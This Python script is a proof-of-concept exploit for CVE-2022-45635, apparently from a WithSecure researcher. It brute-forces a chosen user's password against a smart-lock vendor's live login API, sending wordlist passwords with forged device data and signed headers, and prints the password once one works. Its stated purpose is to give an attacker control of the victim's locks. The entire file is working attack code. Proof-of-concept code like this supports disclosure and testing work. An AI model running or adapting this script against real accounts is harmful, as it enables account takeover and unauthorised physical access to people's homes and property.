#!/bin/python3

# This script is a PoC for CVE-2022-45635
# Crafted by Abdullah Ansari while at WithSecure

# It is designed to crack a target user's password and grant an attacker access to locks owned by them

import sys
import os

current_script_dir = os.path.dirname(__file__)
script_modules_dir = os.path.join(current_script_dir, "..", "script_modules")
sys.path.append(script_modules_dir)

import requests
from collections import OrderedDict
import json
import signkey_generator
import helper_functions
import js2py

proxy = helper_functions.get_proxy()

def victim_login(victim_username, victim_password):
        
    api_login_endpoint = "http://service.oklok.com.cn/app/login/pword"

    request_body = {

        "phone":victim_username,
        "pword":victim_password,
        "errMsg":"getSystemInfoSync:ok",
        "brand":"LGE",
        "model":"Nexus 5X",
        "pixelRatio":2.625,
        "screenWidth":411,
        "screenHeight":683,
        "windowWidth":411,
        "windowHeight":615,
        "statusBarHeight":24,
        "language":"en-US",
        "system":"Android 8.1.0",
        "version":"1.9.9.81245",
        "fontSizeSetting":"",
        "platform":"android",
        "SDKVersion":"",
        "windowTop":0,
        "windowBottom":0,
        "safeArea":
            {
                "left":0,
                "right":411,
                "top":0,
                "bottom":615,
                "width":411,
                "height":615
            },
        "safeAreaInsets":
            {
                "top":0,
                "right":0,
                "bottom":0,
                "left":0
            },
        "deviceId":"41ce875094b89734",
        "org":"100100100",
        "appid":"wxda28f39391f7372d",
        "appVersion":"DBD+1.4.2"
    }

    request_cookies = helper_functions.get_cookie()
  
    date_string = helper_functions.get_date_string()

    content_length = str(len(json.dumps(request_body,separators=(',', ':'))))

    sign_key = signkey_generator.generate_signkey(date_string, json.dumps(request_body,separators=(',', ':')), "login/pword")

    request_headers = OrderedDict()
    request_headers["appid"] = "wxda28f39391f7372d"
    request_headers["SecSignDest"] = sign_key
    request_headers["Content-Date"] = date_string
    request_headers["lang"] = "en-US"
    request_headers["token"] = ""
    request_headers["user-agent"] = "Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM7.181205.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.89 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/24.0)"
    request_headers["Content-Type"] = "application/json"
    request_headers["Content-Length"] = content_length
    request_headers["Host"] = "service.oklok.com.cn"
    request_headers["Connection"] = "close"
    request_headers["Accept-Encoding"] = "gzip, deflate"
    
    session = requests.Session()

    api_request = requests.Request('POST', api_login_endpoint, headers=request_headers, data=json.dumps(request_body,separators=(',', ':')),cookies=request_cookies) 

    prepared_api_request = session.prepare_request(api_request)

    session.headers = request_headers

    del prepared_api_request.headers['Accept']

    response = session.send(prepared_api_request, proxies=proxy)

    parsed_response = response.json()
    
    return parsed_response["code"]

def main():

    print("\n[*] CVE-2022-45635 PoC")
    print("[*] Author: Abdullah Ansari")

    PASSWORD_FOUND = 0

    if len(sys.argv) != 3:

        sys.exit('\nUsage: python3 CVE-2022-45635_PoC.py <target_username> <wordlist>')
    
    else:
    
        victim_username = str(sys.argv[1])
        wordlist_file = sys.argv[2]

    print("\n[*] Starting bruteforce attack!")

    with open(wordlist_file, "r") as working_passwords:

        for every_password in working_passwords:

            every_password = every_password.strip("\n")

            if(victim_login(victim_username, every_password) == 0):

                PASSWORD_FOUND = 1
                print("\n[+] The target account's password was found!")
                print("\n[+] The password for \"" + victim_username + "\" is \"" + every_password + "\"")
                sys.exit()

            else:

                pass

    if(PASSWORD_FOUND != 1):

        print("\n[-] You're password dictionary did not contain the target user's password!")

if __name__ == '__main__':
    main()
